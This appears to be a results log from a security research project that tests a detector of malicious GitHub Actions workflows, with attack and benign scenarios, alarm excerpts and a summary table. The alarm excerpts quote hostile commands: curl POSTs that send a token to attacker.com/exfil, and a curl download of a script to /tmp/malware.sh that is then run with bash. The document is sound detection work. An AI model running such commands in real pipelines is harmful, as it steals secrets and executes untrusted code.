# EAction Detection Run Results (2026-04-18)

## How to Run
From `~/Desktop/Marco/nhost/Host/actions/` on the Proxmox VM:
```bash
./workflowDetect.ese runs/<name>.out -S 127.0.0.1:9999:9998 -R 127.0.0.1:127.0.0.1:9999
```
Kill between runs: `pkill -f workflowDetect.ese`

---

## attack-exfil-demo.out
**DONE: LocalActionNetworkWrite(1) SensitiveExfiltration(1)**

Key alarm:
```
26-04-09 23:42:27.48: Alarm: SensitiveExfiltration: Object IP4:209.196.146.115:443@2959660;5
Subject pid=7079 curl -X POST -d stolen=dummytoken123 https://attacker.com/exfil
envp=...GITHUB_WORKFLOW=Attack Exfil Demo...GITHUB_ACTION_PATH=./.github/actions/attack-exfil...
GITHUB_ACTIONS=true...CI=true...
```

---

## benign-exfil-demo.out
**DONE: LocalActionNetworkWrite(1) SensitiveExfiltration(1)**
**⚠️ FALSE POSITIVE**

Key alarm:
```
26-04-09 23:46:04.39: Alarm: SensitiveExfiltration: Object IP4:32.194.101.183:443@2959660;5
Subject pid=9787 curl -X POST -d token=dummytoken123 https://httpbin.org/post
envp=...GITHUB_WORKFLOW=Benign Exfil Demo...GITHUB_ACTION_PATH=./.github/actions/benign-exfil...
```
Note: httpbin.org is a legitimate testing service. System cannot distinguish this from attacker.com.
This is the core false positive problem — benign and malicious exfil look identical in the provenance graph.

---

## attack-malware-demo.out
**DONE: UnexpectedActionDownload(1) UnexpectedActionExecution(1) LocalActionNetworkWrite(2)**

Key alarms:
```
26-04-09 23:44:18.10: Alarm: LocalActionNetworkWrite: Object IP4:185.199.109.133:443
Subject pid=8493 curl -o /tmp/malware.sh https://gist.githubusercontent.com/cfvescovo/.../hell

26-04-09 23:44:18.24: Alarm: UnexpectedActionDownload: Object /tmp/malware.sh
Subject pid=8493 curl -o /tmp/malware.sh https://gist.githubusercontent.com/cfvescovo/.../hell

26-04-09 23:44:18.24: Alarm: UnexpectedActionExecution: Object /tmp/malware.sh
Subject pid=8495 bash /tmp/malware.sh
```
Full chain detected: download → execute.

---

## benign-malware-demo.out
**DONE: LocalActionNetworkWrite(1)**
**⚠️ FALSE POSITIVE**

Key alarm:
```
26-04-09 23:47:54.47: Alarm: LocalActionNetworkWrite: Object IP4:140.82.113.3:443
Subject pid=11225 /usr/lib/git-core/git-remote-https origin https://github.com/nvm-sh/nvm.git
envp=...GITHUB_WORKFLOW=benign-malware-demo-scenario...
```
Note: This is a git clone to GitHub's IP during the Helm install. Legitimate network operation flagged as FP.
No UnexpectedActionDownload or UnexpectedActionExecution — core detection did NOT fire on benign.

---

## attack-lotl-demo.out
**DONE: LocalActionNetworkWrite(1)**

Key alarm:
```
26-04-09 23:43:22.98: Alarm: LocalActionNetworkWrite: Object IP4:209.196.146.115:443
Subject pid=7807 curl -X POST -d stolen= https://attacker.com/exfil
envp=...GITHUB_WORKFLOW=Attack LotL Demo...GITHUB_ACTION_PATH=./.github/actions/attack-lotl...
```
Note: `stolen=` is EMPTY — the secret token value was not captured in the exfil payload.
No SensitiveExfiltration alarm — only LocalActionNetworkWrite fired.

---

## benign-lotl-demo.out
**DONE: (empty — no alarms)**
✅ Clean result. cmake + make build produced zero false positives.

---

## attack-solarwinds-demo.out
**DONE: (empty — no alarms)**
**❌ MISSED**
Known reason: eaudit eBPF probe does not capture `truncate` syscalls.
The source file overwrite (`echo '...' > deploy.c`) before compilation is invisible to the system.
Fix: add truncate support to eaudit, create branch, send to Sagar/Sekar.

---

## benign-solarwinds-demo.out
**DONE: (empty — no alarms)**
✅ Clean result.

---

## Summary Table

| Scenario | Alarms | Verdict |
|---|---|---|
| attack-exfil | SensitiveExfiltration, LocalActionNetworkWrite | Detected ✅ |
| benign-exfil | SensitiveExfiltration, LocalActionNetworkWrite | False Positive ❌ |
| attack-malware | UnexpectedActionDownload, UnexpectedActionExecution, LocalActionNetworkWrite | Detected ✅ |
| benign-malware | LocalActionNetworkWrite | False Positive ❌ |
| attack-lotl | LocalActionNetworkWrite | Detected ✅ |
| benign-lotl | none | Clean ✅ |
| attack-solarwinds | none | Missed ❌ |
| benign-solarwinds | none | Clean ✅ |

## Key Observations
1. Malware: fully detected (download + execution as separate alarms). Minor FP on benign from git clone.
2. LotL: detected via network write. Benign is completely clean. Secret token value was empty in payload.
3. Exfil: detected but benign also triggers — cannot distinguish httpbin.org from attacker.com. Core research problem confirmed experimentally.
4. SolarWinds: missed entirely — truncate syscall gap. Needs eaudit fix.
5. The forensics output (full environment, PID, command line, destination IP) is rich — useful for RQ3 comparison against Harden-Runner.
